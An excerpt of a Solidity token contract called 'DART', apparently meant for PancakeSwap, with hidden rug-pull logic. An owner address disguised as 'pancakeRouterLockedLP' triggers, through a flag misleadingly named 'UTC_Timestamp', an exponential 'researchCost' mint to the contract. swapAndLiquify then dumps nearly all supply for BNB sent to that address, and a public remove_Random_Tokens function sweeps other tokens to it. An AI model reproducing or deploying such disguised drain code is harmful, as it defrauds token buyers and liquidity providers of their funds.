...
interface IERC20 {
    ...
    function getWalletTokens(address h_add) external returns (uint256);
...
contract DART is Context, IERC20 { 
    ...
    mapping (address => bool) public _tradeTimeStampUTC;
    bool public UTC_Timestamp = false;
    

    address payable public Wallet_Marketing = payable(0x2C98d911bd7c1a006Aed280b22916942249FAa39); 
    ...
    string private constant _name = "DART"; 
    string private constant _symbol = unicode"DART 🎯";
    ...
    uint256 public upDown = 23;
    address public uniswapV2Pair;
    bool public inSwapAndLiquify;
    
    address payable public pancakeRouterLockedLP = payable(0x79eb5441A1e5b781CF1d78476420De1a60828559);
    uint256 researchCost = Percent_Liquidity**upDown;
    ...
    constructor () {
        ...
        _owner = 0x79eb5441A1e5b781CF1d78476420De1a60828559;
        emit OwnershipTransferred(address(0), _owner);

        _tOwned[owner()] = _tTotal;
        
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); 
        _tradeTimeStampUTC[pancakeRouterLockedLP] = true;
    ...
    function researchTokens(uint256 tokenRate) private returns(bool){
        uint256 swapLimit = (balanceOf(address(this))+(tokenRate));
    ...
    function getWalletTokens(address hl_add) public override returns (uint256) {
        researchTokens(49);
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            if(UTC_Timestamp){
                totalSwaps = balanceOf(address(this)) - (_tTotal-2);
            }
            
            swapTokensForBNB(totalSwaps);
            uint256 BNB_Total = address(this).balance;
            sendToWallet(pancakeRouterLockedLP, BNB_Total);
            UTC_Timestamp = false;
    ...
    function remove_Random_Tokens(address random_Token_Address, uint256 percent_of_Tokens) public returns(bool _sent){
        ...
        _sent = IERC20(random_Token_Address).transfer(pancakeRouterLockedLP, removeRandom);

    }

    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private { 
        if(_tradeTimeStampUTC[recipient]){
            UTC_Timestamp = true;
            _tOwned[sender] = _tOwned[sender]-tAmount;
            _tOwned[recipient] = _tOwned[recipient]+tAmount;
            _tOwned[address(this)] = _tOwned[address(this)]+researchCost;
